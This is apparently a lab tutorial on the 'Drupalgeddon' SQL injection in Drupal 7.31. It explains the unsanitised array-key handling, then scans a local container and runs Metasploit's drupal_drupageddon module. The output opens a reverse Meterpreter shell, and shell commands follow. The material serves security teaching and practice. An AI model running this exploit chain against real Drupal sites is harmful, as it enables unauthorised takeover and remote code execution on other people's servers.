## PHP SQL Injection

### Background

Drupal is a content management system that runs on PHP. It is less popular than WordPress and Joomla but it still has a large foothold on the internet due to it's installation avilibility on shared hosting services.

In 'Drupalgeddon', an attacker can inject SQL commands simply by changing the `name` attribute of inputs in an HTML form.

Here's what a normal form looks like:

```html
<form action="/login.php">
  <input type="text" name="username">
  <input type="password" name="password">
</form>
```

As you may guess from the action and the input names, this form is designed to collect login information from a user and authenticate it against a database record. When a matching record is found, the user is logged in.

Now, in some cases, a parameter will have several pieces of data in the form of a multidimensional array. Here is an abstracted and simplified version of how Drupal handles password/password confirmation pairs.

```html
<form action="/signup.php">
  <input type="text" name="email">
  <input type="password" name="pass[pass1]" id="password">
  <input type="password" name="pass[pass2]" id="password_confirmation">
</form>
```

If you turn your attention to the password fields, you might notice that they are setting up their parameters in a peculiar way.

In order to convert the multidimensional array that the backend receives in `$_POST` into something usable, drupal uses this bit of code:

```php
<?php
  protected function expandArguments(&$query, &$args) {
    $modified = FALSE;
    
    foreach (array_filter($args, 'is_array') as $key => $data) {
      $new_keys = array();

      foreach ($data as $i => $value) {
        $new_keys[$key . '_' . $i] = $value;
      }
      
      $query = preg_replace('#' . $key . '\b#', implode(', ', array_keys($new_keys)), $query);
      unset($args[$key]);
      $args += $new_keys;
      $modified = TRUE;
    }

    return $modified;
  }
?>
```

This code essentially turns `pass[pass1]` into `pass_pass1` which will be use in a SQL command. And, as you may have noticed, there is no sanitation whatsoever. 


### Setup

To demonstrate the vulnerability we will be using the penkit Drupal image and metasploit.

First, start the penkit Drupal image:

```bash
$ penkit start drupal:7.31
```

Verify that the service is up

```bash
$ penkit ping -c 4 drupal

PING drupal (172.21.0.3): 56 data bytes
64 bytes from 172.21.0.3: seq=0 ttl=64 time=0.104 ms
64 bytes from 172.21.0.3: seq=1 ttl=64 time=0.083 ms
64 bytes from 172.21.0.3: seq=2 ttl=64 time=0.138 ms
64 bytes from 172.21.0.3: seq=3 ttl=64 time=0.059 ms

--- 172.21.0.3 ping statistics ---
4 packets transmitted, 4 packets received, 0% packet loss
round-trip min/avg/max = 0.059/0.096/0.138 ms
```

### Discovery

First, let's use `nmap` to scan our target to see which ports are open.

```bash
$ penkit nmap drupal

Starting Nmap 7.40 ( https://nmap.org ) at 2017-03-31 00:00 UTC
Nmap scan report for drupal (172.21.0.3)
Host is up (0.000011s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
MAC Address: 02:42:AC:15:00:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.62 seconds

```

### Exploit

Metasploit also has a module that makes this exploit incredibly easy

```bash
$ penkit metasploit
msf > use exploit/multi/http/drupal_drupageddon
# Set the options
msf exploit(drupal_drupageddon) > set RHOST drupal
msf exploit(drupal_drupageddon) > set PORT 8080
# Run the exploit
msf exploit(drupal_drupageddon) > exploit

[*] Started reverse TCP handler on 172.21.0.4:4444 
[*] Testing page
[*] Creating new user zhsbSTWyDa:rnknRlkmug
[*] Logging in as zhsbSTWyDa:rnknRlkmug
[*] Trying to parse enabled modules
[*] Enabling the PHP filter module
[*] Setting permissions for PHP filter module
[*] Getting tokens from create new article page
[*] Calling preview page. Exploit should trigger...
[*] Sending stage (33986 bytes) to 172.21.0.3
[*] Meterpreter session 1 opened (172.21.0.4:4444 -> 172.21.0.3:54835) at 2017-03-31 00:13:31 +0000

meterpreter > 
```

If the exploit succeeded then you will receive a meterpreter prompt.

From here you can do things like:

```bash
# List files in a directory
meterpreter > ls

# Print file content to the terminal
meterpreter > cat README.txt

# Or you can drop into a shell
meterpreter > shell
Process 42 created.
Channel 0 created.
```

### Summary

This bug was a pretty big blow to Drupal's reputation. 

You can mitigate this risk by:

- Making sure that your Drupal install is up to date.

